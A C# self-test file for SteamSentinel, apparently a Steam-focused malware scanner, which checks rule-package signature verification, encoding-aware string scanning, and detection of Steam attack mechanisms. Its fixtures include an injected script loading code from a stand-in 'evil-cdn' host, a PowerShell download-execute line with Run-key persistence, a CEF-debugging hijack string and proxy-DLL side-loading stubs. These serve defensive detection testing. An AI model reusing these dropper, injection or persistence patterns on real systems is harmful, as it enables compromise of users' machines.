using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using SteamSentinel.App.ViewModels;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Reporting;
using SteamSentinel.Core.Rules;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private static async Task TestP2ADetectionPerformanceAsync(string root)
    {
        string work = Path.Combine(root, "p2a-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(work);

        TestP2ARulePackageContracts(work);
        await TestP2APerformanceEquivalenceAsync(work);
        await TestP2AMechanismDetectionAsync(work);
        await TestP2AGentleAmsiAndBenignMsiAsync(work);
    }

    private static void TestP2ARulePackageContracts(string work)
    {
        RuleSet builtIn = RuleLoader.LoadEmbedded();
        ActiveRuleSnapshot emptyDirSnapshot = RulePackageManager.LoadActive(Path.Combine(work, "no-rules-dir"));
        Check("P2-A 规则包目录缺失时安全使用内置规则",
            emptyDirSnapshot.Metadata.Source == RulePackageManager.SourceBuiltIn &&
            emptyDirSnapshot.Metadata.Notice is null &&
            emptyDirSnapshot.Rules.KnownHashes.Count == builtIn.KnownHashes.Count);

        string corruptDir = Path.Combine(work, "corrupt-rules");
        Directory.CreateDirectory(corruptDir);
        File.WriteAllText(Path.Combine(corruptDir, "active.rules.json"), "{invalid-json");
        ActiveRuleSnapshot fallbackSnapshot = RulePackageManager.LoadActive(corruptDir);
        Check("P2-A 损坏本地规则包回退内置规则且带提示",
            fallbackSnapshot.Metadata.Source == RulePackageManager.SourceBuiltIn &&
            !string.IsNullOrWhiteSpace(fallbackSnapshot.Metadata.Notice) &&
            fallbackSnapshot.Rules.KnownHashes.Count == builtIn.KnownHashes.Count);

        using RSA rsa = RSA.Create(2048);
        using RSA publicOnly = RSA.Create();
        publicOnly.ImportParameters(rsa.ExportParameters(false));

        DateTimeOffset now = DateTimeOffset.UtcNow;
        JsonSerializerOptions webJson = new(JsonSerializerDefaults.Web)
        {
            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
            Converters = { new JsonStringEnumConverter() }
        };

        byte[] SignEnvelope(byte[] payloadBytes, string? keyId = null, int envelopeSchema = 1, bool tamperSignature = false)
        {
            byte[] signature = rsa.SignData(payloadBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pss);
            if (tamperSignature) signature[0] ^= 0xFF;
            var envelope = new
            {
                schemaVersion = envelopeSchema,
                keyId = keyId ?? RulePackageManager.SigningKeyId,
                payloadBase64 = Convert.ToBase64String(payloadBytes),
                signatureBase64 = Convert.ToBase64String(signature)
            };
            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(envelope, webJson));
        }

        string extraHash = new('9', 64);
        var validPayload = new
        {
            schemaVersion = 1,
            product = "SteamSentinel",
            version = "2099.01.01.1",
            publishedAtUtc = now.AddMinutes(-5),
            expiresAtUtc = now.AddDays(90),
            minimumEngineVersion = ProductInfo.Version,
            knownHashes = new[]
            {
                new HashRule
                {
                    Id = "P2A-TEST-HASH",
                    Sha256 = extraHash,
                    Label = "Synthetic test hash rule",
                    Severity = FindingSeverity.Critical,
                    Malware = true
                }
            },
            knownDomains = new[] { "p2a-fixture-domain.invalid" },
            knownProcessNames = new[] { "p2a-fixture-process.exe" },
            suspiciousStrings = new[]
            {
                new StringRule
                {
                    Id = "P2A-TEST-STR",
                    Value = "P2A_SYNTHETIC_MARKER",
                    Score = 50,
                    Label = "Synthetic marker"
                }
            }
        };

        byte[] validPayloadBytes = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(validPayload, webJson));
        byte[] validEnvelope = SignEnvelope(validPayloadBytes);
        RulePackagePayload verified = RulePackageManager.VerifyPackage(validEnvelope, publicOnly, now);
        RuleSet merged = RulePackageManager.MergeWithBuiltIn(builtIn, verified);
        Check("P2-A 签名规则包验签成功且增量保留全量内置规则",
            verified.Version == "2099.01.01.1" &&
            merged.KnownHashes.Count == builtIn.KnownHashes.Count + 1 &&
            merged.KnownHashes.Any(r => r.Sha256 == extraHash) &&
            merged.KnownDomains.Contains("p2a-fixture-domain.invalid") &&
            merged.KnownProcessNames.Contains("p2a-fixture-process.exe") &&
            merged.SuspiciousStrings.Any(s => s.Id == "P2A-TEST-STR"));

        Check("P2-A 签名包篡改拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(validPayloadBytes, tamperSignature: true), publicOnly, now)));
        Check("P2-A 签名包陌生KeyId拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(validPayloadBytes, keyId: new string('0', 40)), publicOnly, now)));

        byte[] duplicateJson = "{\"schemaVersion\":1,\"keyId\":\"3395882D18D66EFA1545C1FE6DD867EB004176D1\",\"keyId\":\"3395882D18D66EFA1545C1FE6DD867EB004176D1\",\"payloadBase64\":\"e30=\",\"signatureBase64\":\"e30=\"}"u8.ToArray();
        Check("P2-A 签名包重复JSON字段拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(duplicateJson, publicOnly, now)));

        byte[] unmappedPayload = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new
        {
            schemaVersion = 1,
            product = "SteamSentinel",
            version = "2099.01.01.1",
            publishedAtUtc = now.AddMinutes(-5),
            expiresAtUtc = now.AddDays(90),
            minimumEngineVersion = ProductInfo.Version,
            unexpectedExtraField = true
        }, webJson));
        Check("P2-A 签名包未知字段拒绝", V020Throws<JsonException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(unmappedPayload), publicOnly, now)));

        byte[] downgradedVersion = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new
        {
            schemaVersion = 1,
            product = "SteamSentinel",
            version = "2025.01.01.1",
            publishedAtUtc = now.AddMinutes(-5),
            expiresAtUtc = now.AddDays(90),
            minimumEngineVersion = ProductInfo.Version
        }, webJson));
        Check("P2-A 签名包低于内置版本降级拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(downgradedVersion), publicOnly, now)));

        byte[] expiredPayload = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new
        {
            schemaVersion = 1,
            product = "SteamSentinel",
            version = "2099.01.01.1",
            publishedAtUtc = now.AddDays(-10),
            expiresAtUtc = now.AddMinutes(-1),
            minimumEngineVersion = ProductInfo.Version
        }, webJson));
        Check("P2-A 过期签名包拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(expiredPayload), publicOnly, now)));

        byte[] tooLongValidity = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new
        {
            schemaVersion = 1,
            product = "SteamSentinel",
            version = "2099.01.01.1",
            publishedAtUtc = now.AddMinutes(-5),
            expiresAtUtc = now.AddDays(368),
            minimumEngineVersion = ProductInfo.Version
        }, webJson));
        Check("P2-A 有效期超366天签名包拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(tooLongValidity), publicOnly, now)));

        byte[] highEnginePayload = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new
        {
            schemaVersion = 1,
            product = "SteamSentinel",
            version = "2099.01.01.1",
            publishedAtUtc = now.AddMinutes(-5),
            expiresAtUtc = now.AddDays(30),
            minimumEngineVersion = "99.0.0"
        }, webJson));
        Check("P2-A 过高最低引擎版本包拒绝", V020Throws<InvalidDataException>(() =>
            RulePackageManager.VerifyPackage(SignEnvelope(highEnginePayload), publicOnly, now)));

        RulePackagePayload overwriteBuiltIn = new(1, "SteamSentinel", "2099.01.01.1", now, now.AddDays(30), ProductInfo.Version,
            KnownHashes:
            [
                new HashRule
                {
                    Id = builtIn.KnownHashes[0].Id,
                    Sha256 = new string('F', 64),
                    Label = "Mutated label",
                    Malware = false
                }
            ]);
        Check("P2-A 规则合并拒绝改写内置哈希", V020Throws<InvalidDataException>(() =>
            RulePackageManager.MergeWithBuiltIn(builtIn, overwriteBuiltIn)));

        ActiveRuleSnapshot mergedSnapshot = new(merged, new RuleSetMetadata("2099.01.01.1", now, RulePackageManager.SourceSignedPackage, merged.KnownHashes.Count, merged.KnownDomains.Count));
        Check("P2-A 规则迁移拒绝删除既有规则", V020Throws<InvalidDataException>(() =>
            RulePackageManager.ValidateTransition(mergedSnapshot, "2099.02.01.1", builtIn)));
        Check("P2-A 规则迁移拒绝同版本内容冲突", V020Throws<InvalidDataException>(() =>
            RulePackageManager.ValidateTransition(mergedSnapshot, "2099.01.01.1", builtIn)));
        RulePackageManager.ValidateTransition(mergedSnapshot, "2099.01.01.1", merged);
        Check("P2-A 同版本同内容规则迁移保持幂等", true);
    }

    private static async Task TestP2APerformanceEquivalenceAsync(string work)
    {
        RuleSet rules = RuleLoader.LoadEmbedded();
        string[] tokens = rules.SuspiciousStrings.Select(s => s.Value).ToArray();

        // 1. 纯 UTF-8（无 0x00 字节，验证跳解码短路下正则与特征 100% 命中）
        string utf8Path = Path.Combine(work, "pure-utf8.ps1");
        string utf8Content = "# harmless perf fixture\n# luminovastella.top\n# SteamKey20260310\n# Invoke-WebRequest Start-Process\n";
        await File.WriteAllTextAsync(utf8Path, utf8Content, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
        var utf8Signals = await StreamingStringInspection.ReadAsync(utf8Path, tokens, rules.KnownDomains, 1024 * 1024, CancellationToken.None);
        Check("P2-A 纯UTF-8短路优化命中全部ASCII词元域名与脚本信号",
            utf8Signals.Raw.Contains("luminovastella.top") &&
            utf8Signals.Raw.Contains("SteamKey20260310") &&
            utf8Signals.Script.Contains("Invoke-WebRequest") &&
            utf8Signals.Script.Contains("Start-Process"));

        // 2. UTF-16LE（无 BOM）纯中文日志词元（验证非 ASCII 字节快速匹配零漏检）
        string utf16CnNoBom = Path.Combine(work, "utf16le-cn-nobom.txt");
        await File.WriteAllBytesAsync(utf16CnNoBom, Encoding.Unicode.GetBytes("前缀\r\n匹配成功----下载失败----未执行\r\n"));
        var cnSignals = await StreamingStringInspection.ReadAsync(utf16CnNoBom, tokens, rules.KnownDomains, 1024 * 1024, CancellationToken.None);
        Check("P2-A 无BOM UTF-16LE纯中文词元零漏检", cnSignals.Raw.Contains("匹配成功----下载失败----未执行"));

        // 3. UTF-16BE（带 BOM）混合文本与大小写规则
        string utf16BeBom = Path.Combine(work, "utf16be-bom.txt");
        byte[] bePreamble = Encoding.BigEndianUnicode.GetPreamble();
        byte[] beBody = Encoding.BigEndianUnicode.GetBytes("steamkey20260310 匹配成功----下载失败----未执行 Invoke-Expression");
        await File.WriteAllBytesAsync(utf16BeBom, [.. bePreamble, .. beBody]);
        var beSignals = await StreamingStringInspection.ReadAsync(utf16BeBom, tokens, rules.KnownDomains, 1024 * 1024, CancellationToken.None);
        Check("P2-A UTF-16BE文本词元与脚本信号零漏检",
            beSignals.Raw.Contains("SteamKey20260310") &&
            beSignals.Raw.Contains("匹配成功----下载失败----未执行") &&
            beSignals.Script.Contains("Invoke-Expression"));

        // 4. ScriptSignals 字面量拼接与 Base64 路径仍准确归一化
        string joinedNormalized = ScriptSignals.Normalize("'Down'+'loadString' 'http://ex'+'ample.invalid'");
        string plainNormalized = ScriptSignals.Normalize("ordinary plain configuration text without markers");
        Check("P2-A ScriptSignals 快速短路不影响拼接归一化且纯文本零分配返回",
            joinedNormalized.Contains("DownloadString", StringComparison.Ordinal) &&
            plainNormalized == "ordinary plain configuration text without markers");

        // 5. CoverageAggregation.Merge 正确去重合并多核子报告
        ScanReport mergedReport = new();
        ScanReport childA = new();
        ScanReport childB = new();
        CoverageAggregation.Add(childA, "QUICK-CONTENT-NOT-HASHED", work, "a.bin");
        CoverageAggregation.Add(childA, "QUICK-CONTENT-NOT-HASHED", work, "b.bin");
        CoverageAggregation.Add(childB, "QUICK-CONTENT-NOT-HASHED", work, "b.bin");
        CoverageAggregation.Add(childB, "QUICK-CONTENT-NOT-HASHED", work, "c.bin");
        CoverageAggregation.Merge(mergedReport, childA.CoverageAggregates);
        CoverageAggregation.Merge(mergedReport, childB.CoverageAggregates);
        Check("P2-A 并行覆盖率合并消除重复分组且正确累加去重示例",
            mergedReport.Coverage == ScanCoverage.Partial &&
            mergedReport.CoverageAggregates.Count == 1 &&
            mergedReport.CoverageAggregates[0].Count == 4 &&
            mergedReport.CoverageAggregates[0].Examples.SequenceEqual(["a.bin", "b.bin", "c.bin"]));

        // 6. 单卷压缩包复用主文件锁定 SHA-256 与扫描结果完整准确
        string zipPath = Path.Combine(work, "single-vol-reuse.zip");
        CreateZip(zipPath, archive =>
        {
            using StreamWriter writer = new(archive.CreateEntry("payload.txt").Open(), new UTF8Encoding(false));
            writer.Write("steam_save_mafile steam_outbox_list /api/v1/plugin/beacon password");
        });
        string expectedOuterSha = await Hashing.Sha256FileAsync(zipPath);
        ScanReport zipReport = new();
        using (ContentScanner scanner = new(rules))
            await scanner.ScanRootAsync(zipPath, zipReport, ContentOptions(), new NullPasswordProvider());
        ContainerScanNode rootNode = zipReport.Containers!.Nodes.Single(n => n.Kind == ContainerNodeKind.File && n.ParentId is null);
        Check("P2-A 单卷压缩包复用哈希保留准确SHA256与内层检出",
            rootNode.Sha256 == expectedOuterSha &&
            rootNode.Volumes.Count == 1 &&
            rootNode.Volumes[0].Sha256 == expectedOuterSha &&
            zipReport.Findings.Any(f => f.RuleId == "HEUR-STEAM-CREDENTIAL-PLUGIN" && f.TargetSha256 == expectedOuterSha));
    }

    private static async Task TestP2AMechanismDetectionAsync(string work)
    {
        // 1. SystemScanner 可疑进程目录覆盖 %APPDATA%、%ProgramData% 与 %LOCALAPPDATA%\SteamAlertDemo
        MethodInfo suspiciousMethod = typeof(SystemScanner).GetMethod("IsSuspiciousProgramPath", BindingFlags.Static | BindingFlags.NonPublic)!;
        bool IsSuspicious(string p) => (bool)suspiciousMethod.Invoke(null, [p])!;
        string appDataExe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Fake", "drop.exe");
        string programDataExe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Fake", "drop.exe");
        string steamAlertExe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SteamAlertDemo", "Application Frame Host.exe");
        string systemExe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe");
        Check("P2-A 进程扫描覆盖AppData/ProgramData与LocalAppData驻留目录",
            IsSuspicious(appDataExe) && IsSuspicious(programDataExe) && IsSuspicious(steamAlertExe) && !IsSuspicious(systemExe));

        // 2. AuthenticodeVerifier.IsTrustedValveSigner 严格 RDN 验证
        Check("P2-A Valve证书主题严格身份校验",
            AuthenticodeVerifier.IsTrustedValveSigner(SignatureStatus.Valid, "CN=\"Valve Corp.\", O=\"Valve Corp.\", C=US") &&
            AuthenticodeVerifier.IsTrustedValveSigner(SignatureStatus.Valid, "O=Valve Corporation") &&
            !AuthenticodeVerifier.IsTrustedValveSigner(SignatureStatus.Unsigned, "CN=Valve Corp.") &&
            !AuthenticodeVerifier.IsTrustedValveSigner(SignatureStatus.Invalid, "CN=Valve Corp.") &&
            !AuthenticodeVerifier.IsTrustedValveSigner(SignatureStatus.Valid, "CN=Fake Valve Corp., OU=Valve Corp.") &&
            !AuthenticodeVerifier.IsTrustedValveSigner(SignatureStatus.Valid, null));

        // 3. Steam 敏感目录（含 bin\cef 子目录、versionOrg.dll 转发）与非官方外部脚本注入检测
        string steamRoot = Path.Combine(work, "SteamMechFixture");
        string cefSub = Path.Combine(steamRoot, "bin", "cef", "cef.win7x64");
        string win64Dir = Path.Combine(steamRoot, "win64");
        string steamUiDir = Path.Combine(steamRoot, "steamui");
        Directory.CreateDirectory(cefSub);
        Directory.CreateDirectory(win64Dir);
        Directory.CreateDirectory(steamUiDir);

        await File.WriteAllBytesAsync(Path.Combine(cefSub, "version.dll"), Encoding.ASCII.GetBytes("MZ-unsigned-cef-dll"));
        await File.WriteAllBytesAsync(Path.Combine(win64Dir, "versionOrg.dll"), Encoding.ASCII.GetBytes("MZ-forwarder-org"));
        await File.WriteAllBytesAsync(Path.Combine(win64Dir, "version.dll"), Encoding.ASCII.GetBytes("MZ-paired-version"));
        await File.WriteAllTextAsync(Path.Combine(steamUiDir, "external.js"),
            "let s = document.createElement(\"script\"); s.src = \"https://evil-cdn.example.invalid/boot.js?t=\" + Date.now(); document.head.append(s);");
        await File.WriteAllTextAsync(Path.Combine(steamUiDir, "official.js"),
            "let s = document.createElement(\"script\"); s.src = \"https://store.steampowered.com/public/shared.js\"; document.head.append(s);");

        SteamLayout layout = new();
        layout.SteamRoots.Add(steamRoot);
        ScanReport steamReport = new();
        await new SteamSecurityScanner(RuleLoader.LoadEmbedded()).ScanAsync(layout, steamReport);

        Check("P2-A 检出CEF子目录未签名侧载DLL且为High/85",
            steamReport.Findings.Any(f => f.RuleId == "STEAM-PROXY-DLL-PRESENT" &&
                f.Target.EndsWith(Path.Combine("cef.win7x64", "version.dll"), StringComparison.OrdinalIgnoreCase) &&
                f.Severity == FindingSeverity.High && f.Score == 85));
        Check("P2-A 检出versionOrg.dll转发结构且不重复报告普通version.dll",
            steamReport.Findings.Count(f => f.RuleId == "STEAM-DLL-VERSION-FORWARDER") == 1 &&
            steamReport.Findings.All(f => !f.Target.Equals(Path.Combine(win64Dir, "version.dll"), StringComparison.OrdinalIgnoreCase)));
        Check("P2-A 检出SteamUI非官方外部脚本注入且放行Steam官方域名",
            steamReport.Findings.Count(f => f.RuleId == "STEAM-UI-EXTERNAL-SCRIPT") == 1 &&
            steamReport.Findings.Single(f => f.RuleId == "STEAM-UI-EXTERNAL-SCRIPT").Severity == FindingSeverity.High &&
            steamReport.Findings.Single(f => f.RuleId == "STEAM-UI-EXTERNAL-SCRIPT").Score == 85 &&
            steamReport.Findings.Single(f => f.RuleId == "STEAM-UI-EXTERNAL-SCRIPT").Target.EndsWith("external.js", StringComparison.OrdinalIgnoreCase));

        // 4. ContentHeuristics 机制组合规则（且排除 .md 文档）
        string cefHijackScript = Path.Combine(work, "hijack.ps1");
        const string cefPayload = "$args = '-cef-enable-debugging'; WriteAllText('steamui/lib.js', 'patched')";
        await File.WriteAllTextAsync(cefHijackScript, cefPayload);
        string workshopDropper = Path.Combine(work, "steamapps", "workshop", "content", "431960", "12345", "drop.ps1");
        Directory.CreateDirectory(Path.GetDirectoryName(workshopDropper)!);
        const string workshopPayload = "Invoke-WebRequest 'https://example.invalid/a'; Start-Process 'a.exe'; Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'";
        await File.WriteAllTextAsync(workshopDropper, workshopPayload);
        string plainDropper = Path.Combine(work, "not-workshop", "drop.ps1");
        Directory.CreateDirectory(Path.GetDirectoryName(plainDropper)!);
        await File.WriteAllTextAsync(plainDropper, workshopPayload);
        string notesDoc = Path.Combine(work, "steamapps", "workshop", "content", "431960", "12345", "readme.md");
        await File.WriteAllTextAsync(notesDoc, cefPayload + "\n" + workshopPayload);

        Check("P2-A ContentHeuristics 精准命中CEF劫持与工坊下载执行链并排除非工坊及文档",
            ContentHeuristics.Match(cefPayload, cefHijackScript)?.Id == "HEUR-STEAM-CEF-HIJACK" &&
            ContentHeuristics.Match(workshopPayload, workshopDropper)?.Id == "HEUR-WORKSHOP-DROPPER-EXEC" &&
            ContentHeuristics.Match(workshopPayload, plainDropper) is null &&
            ContentHeuristics.Match(cefPayload + workshopPayload, notesDoc) is null);
    }

    private static async Task TestP2AGentleAmsiAndBenignMsiAsync(string work)
    {
        RuleSet rules = RuleLoader.LoadEmbedded();
        string sampleScript = Path.Combine(work, "amsi-sample.ps1");
        await File.WriteAllTextAsync(sampleScript, "Write-Output 'harmless amsi fixture'");

        // 1. AMSI 扫描失败时静默降级、不标为 Partial
        ScanOptions amsiOn = new()
        {
            Mode = ScanMode.Custom,
            IncludeSystem = false,
            IncludeSteam = false,
            IncludeWorkshop = false,
            UseAmsi = true,
            CustomRoots = [sampleScript],
            InspectDeepSignatures = false
        };
        ScanReport errorReport = new() { Mode = ScanMode.Custom };
        using (ContentScanner scanner = new(rules, () => new AmsiScanner(new P2AMockAmsiApi(scanHr: unchecked((int)0x80004005), resultValue: 0))))
            await scanner.ScanRootAsync(sampleScript, errorReport, amsiOn, new NullPasswordProvider());
        Check("P2-A AMSI扫描报错静默降级且保持Complete与节点完成",
            errorReport.Coverage == ScanCoverage.Complete &&
            errorReport.RootSummaries.All(r => r.Coverage == ScanCoverage.Complete) &&
            errorReport.CoverageNotices.Any(n => n.ReasonCode == ReasonCodes.AmsiUnavailable) &&
            errorReport.Containers!.Nodes.Single().ContentCheck == ContainerStageStatus.Complete);

        // 2. AMSI 检出时正常产出 AMSI-DETECTED
        ScanReport detectedReport = new() { Mode = ScanMode.Custom };
        using (ContentScanner scanner = new(rules, () => new AmsiScanner(new P2AMockAmsiApi(scanHr: 0, resultValue: 32768))))
            await scanner.ScanRootAsync(sampleScript, detectedReport, amsiOn, new NullPasswordProvider());
        Check("P2-A AMSI命中毒特征正常产出可处置AMSI-DETECTED",
            detectedReport.Findings.Any(f => f.RuleId == "AMSI-DETECTED" && f.Severity == FindingSeverity.Critical && f.Score == 90 && f.CanRemediate));

        // 3. 普通无信号 MSI 不再误判为 NeedsReview
        string benignMsi = Path.Combine(work, "benign-p2a.msi");
        CreateReadOnlyMsiFixture(benignMsi);
        ScanReport msiReport = new();
        using (ContentScanner scanner = new(rules))
            await scanner.ScanRootAsync(benignMsi, msiReport, ContentOptions(), new NullPasswordProvider());
        Finding benignMsiFinding = msiReport.Findings.Single(f => f.RuleId == "INSTALLER-STRUCTURE");
        FindingHandlingInfo benignHandling = FindingHandlingPresentation.Get(benignMsiFinding);
        Finding legacyBenignMsi = new()
        {
            RuleId = "INSTALLER-STRUCTURE",
            Severity = FindingSeverity.Information,
            SuggestedActions = [SuggestedActionKind.ReviewOnly]
        };
        Finding suspiciousMsi = new()
        {
            RuleId = "INSTALLER-STRUCTURE",
            Severity = FindingSeverity.Medium,
            ReasonCode = RemediationEvidencePolicy.ReviewOnlyReasonCode,
            SuggestedActions = [SuggestedActionKind.ReviewOnly]
        };
        Check("P2-A 普通无信号MSI归入Informational而可疑MSI仍保留NeedsReview",
            benignMsiFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.None]) &&
            !RemediationEvidencePolicy.IsReviewOnlyEvidence(benignMsiFinding) &&
            benignHandling.Disposition == FindingDisposition.Informational &&
            FindingHandlingPresentation.Get(legacyBenignMsi).Disposition == FindingDisposition.Informational &&
            FindingHandlingPresentation.Get(suspiciousMsi).Disposition == FindingDisposition.NeedsReview);
    }

    private sealed class P2AMockAmsiApi(int scanHr, int resultValue) : IAmsiApi
    {
        public int Initialize(string name, out IntPtr context) { context = new IntPtr(1); return 0; }
        public int OpenSession(IntPtr context, out IntPtr session) { session = new IntPtr(2); return 0; }
        public int ScanBuffer(IntPtr context, byte[] buffer, string name, IntPtr session, out int result)
        {
            result = resultValue;
            return scanHr;
        }
        public void CloseSession(IntPtr context, IntPtr session) { }
        public void Uninitialize(IntPtr context) { }
    }
}
